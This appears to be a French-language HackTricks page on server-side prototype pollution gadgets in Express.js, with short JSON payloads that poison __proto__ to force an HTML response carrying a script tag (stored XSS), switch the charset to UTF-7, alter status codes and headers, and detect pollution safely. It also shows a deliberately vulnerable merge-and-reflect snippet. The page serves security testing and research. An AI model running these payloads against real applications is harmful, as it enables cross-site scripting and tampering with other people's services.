# Gadgets de Pollution de Prototype Express

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
## Servir des r√©ponses XSS

### Changer le type de contenu JSON en HTML

Dans une application Express utilisant une **r√©ponse de type de contenu JSON** et refl√©tant un JSON :
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Dans ces cas, le XSS n'est normalement pas possible avec un type de contenu JSON. Cependant, avec la pollution de prototype, nous pouvons **confondre Express pour qu'il serve une r√©ponse HTML.** Cette vuln√©rabilit√© repose sur l'application utilisant **`res.send(obj)`** et l'utilisation du body parser avec le type de contenu application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
En **polluant** √† la fois les propri√©t√©s **`body`** et **`_body`**, il est possible de faire en sorte qu'**Express serve le type de contenu HTML** et refl√®te la propri√©t√© `_body`, ce qui entra√Æne un XSS stock√©.

### Rendre UTF7

Il est possible de faire en sorte qu'express **rende du contenu UTF-7 avec** :
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Techniques de Scan S√©curis√©es

### Espaces JSON

Le PP suivant ajoutera un espace suppl√©mentaire aux attributs √† l'int√©rieur d'un JSON, ce qui ne brisera pas la fonctionnalit√© :
```json
{"__proto__":{"json spaces": " "}}
```
Alors un JSON refl√©t√© ressemblera √† :
```json
{"foo":  "bar"} -- Note the extra space
```
### En-t√™tes expos√©s

Le gadget PP suivant fera en sorte que le serveur renvoie l'en-t√™te HTTP : **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Il n√©cessite que le **module CORS soit install√©**

### **M√©thode OPTIONS**

Avec le payload suivant, il est possible de **masquer une m√©thode d'une r√©ponse OPTIONS** :
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Statut**

Il est possible de changer le **code de statut retourn√©** en utilisant la charge utile PP suivante :
```json
{"__proto__":{"status":510}}
```
### Erreur

Lorsque vous attribuez √† un prototype avec un primitif tel qu'une cha√Æne de caract√®res, cela produit une **op√©ration no-op car le prototype doit √™tre un objet**. Si vous essayez d'assigner un objet prototype √† `Object.prototype` lui-m√™me, cela **lancera une exception**. Nous pouvons utiliser ces deux comportements pour **d√©tecter si la pollution de prototype a r√©ussi** :
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valeur R√©fl√©chie

Si l'application r√©fl√©chit un objet dans la r√©ponse, vous pourriez simplement cr√©er un attribut avec un **nom √©trange et celui de `__proto__`** et si **seul le nom √©trange est r√©fl√©chi**, il est possible que le web soit vuln√©rable :
```json
{"hacktricks":"rocks","__proto__":"test"}
```
Ou si Lodash ou une biblioth√®que similaire est utilis√©e, vous pouvez **d√©finir une propri√©t√© via PP √† l'int√©rieur de l'objet** et si cette propri√©t√© n'est pas refl√©t√©e, c'est parce que Lodash examine l'objet actuel pour voir si la propri√©t√© existe d√©j√† dans l'objet fusionn√© :
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## Divers

### Autoriser les points

Il existe une option dans Express qui vous permet de **cr√©er des objets √† partir des param√®tres de cha√Æne de requ√™te**.\
Vous pourriez certainement l'utiliser dans une **cha√Æne de bugs** pour exploiter une **vuln√©rabilit√© de pollution de prototype**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cr√©e un objet dans Node.**

## R√©f√©rences

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
